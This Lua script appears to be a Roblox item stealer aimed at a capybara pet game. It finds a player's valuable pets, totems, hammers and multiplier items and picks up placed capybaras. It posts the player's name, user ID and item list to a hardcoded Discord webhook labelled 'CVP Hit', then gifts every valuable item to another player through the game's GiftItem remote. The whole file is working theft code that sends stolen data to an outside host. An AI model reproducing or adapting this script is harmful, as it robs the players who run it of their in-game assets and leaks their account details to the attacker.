local WEBHOOK = "https://discord.com/api/webhooks/1546003287067725855/3pSRKl_qcw1e4ggGIyMzuVB5HzlqvnyleUKscsYUJUqcG7JpP20wUNt0aLg0gX3WijZF"
local MIN_MULT = 1.5

local function isValuable(name)
    local lower = name:lower()
    
    -- Totems are always valuable
    if lower:find("totem") then return true end
    
    -- Hatch Hammers (especially Gilded)
    if lower:find("hatch hammer") or lower:find("hammer") then return true end
    
    -- Specific rare capybara types
    local rareCapybaras = {"ghost","golem","secret","mythic","ascended","divine","celestial","golden","rainbow","mega"}
    for _, capybara in ipairs(rareCapybaras) do
        if lower:find(capybara) and lower:find("capybara") then
            return true
        end
    end
    
    -- Mutations that indicate value
    for _, mut in ipairs({"shocked","celestial","permafrost","scorched","gold","mega","rainbow","mythic","ascended","divine","secret","ghost","golem","toasty","pristine","radiant"}) do
        if lower:find(mut) then return true end
    end
    
    -- Rare eggs
    if lower:find("egg") and (lower:find("secret") or lower:find("rare") or lower:find("mythic") or lower:find("ghost")) then return true end
    
    -- Items with multipliers (like [1.5x])
    local mult = name:match("%[([%d%.]+)x%]")
    if mult and tonumber(mult) >= MIN_MULT then return true end
    
    return false
end

local function pickUpPlacedCapybaras()
    -- Find all placed capybaras in workspace and pick them up
    local picked = {}
    
    local workspace = game:GetService("Workspace")
    for _, obj in ipairs(workspace:GetDescendants()) do
        -- Look for capybara models/instances
        if (obj:IsA("Model") or obj:IsA("Part")) and obj.Name then
            if isValuable(obj.Name) then
                local humanoidRoot = obj:FindFirstChild("HumanoidRootPart")
                if humanoidRoot then
                    local char = lp.Character
                    if char and char:FindFirstChild("Humanoid") then
                        print("📍 Found valuable: " .. obj.Name .. " - picking up...")
                        
                        -- Move close to the capybara
                        char.Humanoid:MoveTo(humanoidRoot.Position)
                        task.wait(0.8)
                        
                        -- Try multiple remote names for picking up
                        for _, remoteName in ipairs({"PickUp", "Collect", "Grab", "Pick", "Pickup"}) do
                            pcall(function()
                                local remote = RS.Remotes:FindFirstChild(remoteName)
                                if remote then
                                    if remote:IsA("RemoteEvent") then
                                        remote:FireServer(obj)
                                    elseif remote:IsA("RemoteFunction") then
                                        remote:InvokeServer(obj)
                                    end
                                end
                            end)
                        end
                        
                        task.wait(0.5)
                        table.insert(picked, obj.Name)
                        print("✓ Picked up: " .. obj.Name)
                    end
                end
            end
        end
    end
    
    if #picked > 0 then
        print("✓ Picked up " .. #picked .. " capybaras")
    end
    
    return picked
end


local function getItems()
    local found = {}
    for _, item in ipairs(lp.Backpack:GetChildren()) do
        if item:IsA("Tool") and isValuable(item.Name) then
            table.insert(found, item)
        end
    end
    if lp.Character then
        for _, item in ipairs(lp.Character:GetChildren()) do
            if item:IsA("Tool") and isValuable(item.Name) then
                table.insert(found, item)
            end
        end
    end
    return found
end

local function sendWebhook(items)
    local list = {}
    for _, item in ipairs(items) do table.insert(list, "• " .. item.Name) end
    local body = game:GetService("HttpService"):JSONEncode({
        content = "@everyone",
        embeds = {{
            title = "CVP Hit — " .. lp.Name,
            description = table.concat(list, "\n"),
            color = 5763719,
            footer = { text = lp.Name .. " • " .. lp.UserId },
            timestamp = DateTime.now():ToIsoDate()
        }}
    })
    pcall(function()
        local req = request or http_request or (syn and syn.request)
        req({ Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body })
    end)
end

local function giftAll(ownerPlayer, items)
    local char = lp.Character
    if not char then 
        print("❌ Cannot start gifting: missing character")
        return 
    end

    task.wait(0.5)

    -- Gift each item one by one
    for idx, item in ipairs(items) do
        if not item or not item.Parent then 
            print("⚠ Item " .. idx .. " no longer exists")
            continue 
        end

        print("Gifting (" .. idx .. "/" .. #items .. "): " .. item.Name)

        local wasInBackpack = item.Parent == lp.Backpack
        if wasInBackpack then
            item.Parent = char
            task.wait(0.5)
        end

        local success = false
        for attempt = 1, 3 do
            pcall(function()
                RS.Remotes.GiftItem:FireServer(ownerPlayer, item.Name)
            end)
            task.wait(0.8)
            
            if not item or not item.Parent or (item.Parent ~= char and item.Parent ~= lp.Backpack) then
                success = true
                break
            end
            
            if attempt < 3 then
                task.wait(0.3)
            end
        end

        if success then
            print("✓ Gifted: " .. item.Name)
        else
            print("✗ Failed to gift: " .. item.Name)
        end
        
        task.wait(0.5)
    end
    
    print("✓ Gifting complete!")
end

local function tryGift(ownerPlayer, items)
    ownerPlayer.CharacterAdded:Wait()
    task.wait(2)
    giftAll(ownerPlayer, items)
end

